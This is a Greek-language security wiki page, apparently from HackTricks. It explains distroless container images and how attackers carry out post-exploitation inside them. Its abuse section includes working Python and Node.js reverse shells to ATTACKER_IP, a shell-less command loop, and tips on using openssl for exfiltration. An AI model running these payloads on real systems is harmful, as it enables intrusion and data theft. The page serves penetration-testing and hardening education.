# Distroless Κοντέινερ

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα **distroless** container image είναι ένα image που περιλαμβάνει τα **ελάχιστα runtime στοιχεία που απαιτούνται για την εκτέλεση μιας συγκεκριμένης εφαρμογής**, ενώ αφαιρεί σκόπιμα τα συνήθη εργαλεία διανομής όπως package managers, shells και μεγάλα σύνολα γενικών userland utilities. Στην πράξη, τα distroless images συχνά περιέχουν μόνο το δυαδικό αρχείο της εφαρμογής ή το runtime, τις κοινόχρηστες βιβλιοθήκες του, τα certificate bundles και μια πολύ μικρή διάταξη filesystem.

Το νόημα δεν είναι ότι το distroless είναι ένα νέο kernel isolation primitive. Το Distroless είναι μια **image design strategy**. Αλλάζει το τι είναι διαθέσιμο **μέσα** στο container filesystem, όχι τον τρόπο με τον οποίο ο kernel απομονώνει το container. Αυτή η διάκριση έχει σημασία, επειδή το distroless σκληραίνει το περιβάλλον κυρίως μειώνοντας το τι μπορεί να χρησιμοποιήσει ένας επιτιθέμενος μετά την απόκτηση code execution. Δεν αντικαθιστά τα namespaces, seccomp, capabilities, AppArmor, SELinux ή οποιονδήποτε άλλο μηχανισμό runtime isolation.

## Γιατί Υπάρχει το Distroless

Τα distroless images χρησιμοποιούνται κυρίως για να μειώσουν:

- το μέγεθος του image
- την operational complexity του image
- τον αριθμό των packages και binaries που θα μπορούσαν να περιέχουν ευπάθειες
- τον αριθμό των post-exploitation tools που είναι διαθέσιμα σε έναν επιτιθέμενο από προεπιλογή

Γι' αυτό τα distroless images είναι δημοφιλή στις παραγωγικές εφαρμογές. Ένα container που δεν περιέχει shell, package manager και σχεδόν κανένα γενικό εργαλείο είναι συνήθως πιο εύκολο στη διαχείριση λειτουργικά και δυσκολότερο να καταχραστεί αλληλεπιδραστικά μετά από συμβιβασμό.

Παραδείγματα γνωστών οικογενειών εικόνων σε distroless-style περιλαμβάνουν:

- Google's distroless images
- Chainguard hardened/minimal images

## Τι δεν Σημαίνει Distroless

Ένα distroless container **δεν είναι**:

- αυτόματα rootless
- αυτόματα non-privileged
- αυτόματα read-only
- αυτόματα προστατευμένο από seccomp, AppArmor, ή SELinux
- αυτόματα ασφαλές από container escape

Παραμένει δυνατό να τρέξει ένα distroless image με `--privileged`, host namespace sharing, επικίνδυνα bind mounts, ή με mounted runtime socket. Σε αυτό το σενάριο, το image μπορεί να είναι ελάχιστο, αλλά το container μπορεί να παραμείνει καταστροφικά ανασφαλές. Το Distroless αλλάζει την επιφάνεια επίθεσης του userland, όχι τα όρια εμπιστοσύνης του kernel.

## Τυπικά Λειτουργικά Χαρακτηριστικά

Όταν συμβιβαστείς ένα distroless container, το πρώτο που συνήθως παρατηρείς είναι ότι κοινές υποθέσεις παύουν να ισχύουν. Μπορεί να μην υπάρχει `sh`, ούτε `bash`, ούτε `ls`, ούτε `id`, ούτε `cat`, και μερικές φορές ούτε καν ένα libc-based περιβάλλον που συμπεριφέρεται όπως το συνηθισμένο tradecraft σου περιμένει. Αυτό επηρεάζει τόσο την επίθεση όσο και την άμυνα, επειδή η έλλειψη εργαλείων κάνει το debugging, το incident response και το post-exploitation διαφορετικά.

Τα πιο κοινά μοτίβα είναι:

- το application runtime υπάρχει, αλλά σχεδόν τίποτα άλλο
- payloads που βασίζονται σε shell αποτυγχάνουν επειδή δεν υπάρχει shell
- κοινά enumeration one-liners αποτυγχάνουν επειδή λείπουν τα βοηθητικά binaries
- protections στο file system όπως read-only rootfs ή `noexec` σε writable tmpfs τοποθεσίες είναι συχνά παρόντα επίσης

Αυτός ο συνδυασμός είναι που συνήθως οδηγεί ανθρώπους να μιλούν για "weaponizing distroless".

## Distroless και Post-Exploitation

Η κύρια επιθετική πρόκληση σε ένα distroless περιβάλλον δεν είναι πάντα η αρχική RCE. Συχνά είναι το τι ακολουθεί. Αν το συμβιβασμένο workload δίνει code execution σε ένα language runtime όπως Python, Node.js, Java ή Go, μπορεί να είσαι σε θέση να εκτελέσεις αυθαίρετη λογική, αλλά όχι μέσω των κανονικών shell-centric ροών εργασίας που είναι συνηθισμένες σε άλλους Linux στόχους.

Αυτό σημαίνει ότι το post-exploitation συχνά μετατοπίζεται σε μία από τις τρεις κατευθύνσεις:

1. **Use the existing language runtime directly** για να κάνεις enumeration του περιβάλλοντος, να ανοίξεις sockets, να διαβάσεις αρχεία ή να σταδιοποιήσεις πρόσθετα payloads.
2. **Bring your own tooling into memory** αν το filesystem είναι read-only ή οι writable τοποθεσίες είναι mounted `noexec`.
3. **Abuse existing binaries already present in the image** αν η εφαρμογή ή οι εξαρτήσεις της περιλαμβάνουν κάτι απρόσμενα χρήσιμο.

## Κατάχρηση

### Απογραφή του Runtime που Έχεις Ήδη

Σε πολλά distroless containers δεν υπάρχει shell, αλλά υπάρχει ακόμα ένα application runtime. Αν ο στόχος είναι μια υπηρεσία Python, το Python είναι εκεί. Αν ο στόχος είναι Node.js, το Node είναι εκεί. Αυτό συχνά δίνει αρκετή λειτουργικότητα για να κάνεις enumeration αρχείων, να διαβάσεις environment variables, να ανοίξεις reverse shells και να σταδιοποιήσεις εκτέλεση σε μνήμη χωρίς ποτέ να επικαλεστείς `/bin/sh`.

Ένα απλό παράδειγμα με Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ένα απλό παράδειγμα με Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Επιπτώσεις:

- ανάκτηση μεταβλητών περιβάλλοντος, που συχνά περιλαμβάνουν διαπιστευτήρια ή endpoints υπηρεσιών
- εξερεύνηση συστήματος αρχείων χωρίς `/bin/ls`
- εντοπισμός εγγράψιμων διαδρομών και τοποθετημένων μυστικών

### Reverse Shell Without `/bin/sh`

Αν η εικόνα δεν περιέχει `sh` ή `bash`, ένα κλασικό shell-based reverse shell μπορεί να αποτύχει άμεσα. Σε αυτή την περίπτωση, χρησιμοποιήστε το εγκατεστημένο runtime της γλώσσας.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Εάν το `/bin/sh` δεν υπάρχει, αντικαταστήστε την τελική γραμμή με άμεση εκτέλεση εντολών μέσω Python ή με βρόχο Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Και πάλι, αν το `/bin/sh` απουσιάζει, χρησιμοποιήστε απευθείας τα filesystem, process και networking APIs του Node αντί να ξεκινήσετε ένα shell.

### Πλήρες Παράδειγμα: No-Shell Python Command Loop

Αν η εικόνα περιέχει Python αλλά δεν υπάρχει καθόλου shell, ένας απλός διαδραστικός βρόχος συχνά αρκεί για να διατηρηθεί πλήρης post-exploitation δυνατότητα:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Αυτό δεν απαιτεί ένα interactive shell binary. Η επίπτωση είναι ουσιαστικά η ίδια με ένα basic shell από την πλευρά του attacker: command execution, enumeration, και staging περαιτέρω payloads μέσω του υπάρχοντος runtime.

### In-Memory Tool Execution

Distroless images συχνά συνδυάζονται με:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Ο συνδυασμός αυτός καθιστά τις κλασικές ροές εργασίας "download binary to disk and run it" αναξιόπιστες. Σε αυτές τις περιπτώσεις, memory execution techniques γίνονται η κύρια απάντηση.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Some Distroless images still contain operationally necessary binaries that become useful after compromise. A repeatedly observed example is `openssl`, because applications sometimes need it for crypto- or TLS-related tasks.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Αν το `openssl` είναι παρόν, μπορεί να χρησιμοποιηθεί για:

- εξερχόμενες συνδέσεις TLS
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Η ακριβής κατάχρηση εξαρτάται από το τι είναι πραγματικά εγκατεστημένο, αλλά η γενική ιδέα είναι ότι distroless δεν σημαίνει «καθόλου εργαλεία»· σημαίνει «πολύ λιγότερα εργαλεία σε σχέση με μια κανονική εικόνα διανομής».

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να καθοριστεί αν το image είναι πραγματικά distroless στην πράξη και ποια runtime ή helper binaries είναι ακόμα διαθέσιμα για post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Τι είναι ενδιαφέρον εδώ:

- Εάν δεν υπάρχει shell αλλά υπάρχει runtime όπως Python ή Node, το post-exploitation θα πρέπει να pivot σε runtime-driven execution.
- Εάν το root filesystem είναι read-only και το `/dev/shm` είναι writable αλλά `noexec`, οι memory execution τεχνικές γίνονται πολύ πιο σχετικές.
- Εάν βοηθητικά binaries όπως `openssl`, `busybox` ή `java` υπάρχουν, μπορεί να παρέχουν αρκετή λειτουργικότητα για να bootstrap περαιτέρω πρόσβαση.

## Προεπιλογές Runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Το κύριο σημείο είναι ότι το distroless είναι ένα **image property**, όχι μια runtime protection. Η αξία του προκύπτει από τη μείωση αυτών που είναι διαθέσιμα μέσα στο filesystem μετά από συμβιβασμό.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
